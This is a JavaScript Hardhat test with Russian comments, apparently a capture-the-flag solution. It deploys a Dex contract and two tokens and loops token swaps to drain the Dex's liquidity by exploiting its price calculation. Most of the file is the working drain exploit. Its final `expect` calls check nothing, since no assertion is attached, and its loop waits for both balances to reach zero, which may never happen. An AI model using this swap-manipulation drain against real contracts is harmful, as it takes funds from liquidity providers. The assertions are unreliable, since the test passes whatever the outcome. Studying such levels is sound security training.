const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Dex Drain Test", function () {
  let Dex, SwappableToken;
  let dex, token1, token2;
  let owner, user;

  beforeEach(async function () {
    // Получаем учетные записи
    [owner, user] = await ethers.getSigners();

    // Разворачиваем контракт Dex
    Dex = await ethers.getContractFactory("Dex");
    dex = await Dex.connect(owner).deploy();
    await dex.waitForDeployment();
    
    console.log("Dex address", dex.target);
    
    // Разворачиваем два токена
    SwappableToken = await ethers.getContractFactory("SwappableToken");
    token1 = await SwappableToken.deploy(dex.target, "Token1", "TKN1", 1000);
    await token1.waitForDeployment();
    token2 = await SwappableToken.deploy(dex.target, "Token2", "TKN2", 1000);
    await token2.waitForDeployment();

    console.log("Token 1 address:", token1.target);
    console.log("Token 2 address:", token2.target);
    
    // Устанавливаем токены в контракте Dex
    await dex.setTokens(token1.target, token2.target);
    // Добавляем ликвидность в Dex контракт
    await token1.connect(owner).transfer(dex.target, 100);
    await token2.connect(owner).transfer(dex.target, 100);
    console.log("User address", user.address);
    // Передаем пользователю начальные балансы для атаки
    await token1.connect(owner).transfer(user.address, 10);
    await token2.connect(owner).transfer(user.address, 10);
    // Одобряем Dex для управления токенами пользователя
    await token1.connect(user).approve(dex.target, 1000000000000000);
    await token2.connect(user).approve(dex.target, 1000000000000000);
  });

  it("should drain all tokens from Dex", async function () {
    let balanceToken1, balanceToken2;
    while (true) {
      // Получаем текущие балансы Dex контракта
      const dexBalanceToken1 = await token1.balanceOf(dex.target);
      const dexBalanceToken2 = await token2.balanceOf(dex.target);
      console.log("Contract balances: ", dexBalanceToken1, dexBalanceToken2);

      // Проверяем, пуст ли контракт
      if (dexBalanceToken1 == 0 && dexBalanceToken2 == 0) {
        console.log("Контракт Dex опустошен");
        break;
      }
      // Получаем балансы пользователя
      balanceToken1 = await token1.balanceOf(user.address);
      balanceToken2 = await token2.balanceOf(user.address);
      console.log("User balance: ", balanceToken1, balanceToken2);
      console.log("---------------------------------------------");
      if (balanceToken1 > 0) {
        if (balanceToken1 > dexBalanceToken1) {
          await dex.connect(user).swap(token1.target, token2.target, dexBalanceToken1);
        } else {
          // Меняем токен1 на токен2
          await dex.connect(user).swap(token1.target, token2.target, balanceToken1);
        }
      } else if (balanceToken2 > 0) { 
        if (balanceToken2 > dexBalanceToken2) {
          await dex.connect(user).swap(token2.target, token1.target, dexBalanceToken2);
        } else {
          // Меняем токен2 на токен1
          await dex.connect(user).swap(token2.target, token1.target, balanceToken2);
        }
      }
    }
    // Проверяем, что все токены из контракта Dex были выведены
    expect(await token1.balanceOf(dex.target) == 0);
    expect(await token2.balanceOf(dex.target) == 0);
  });
});
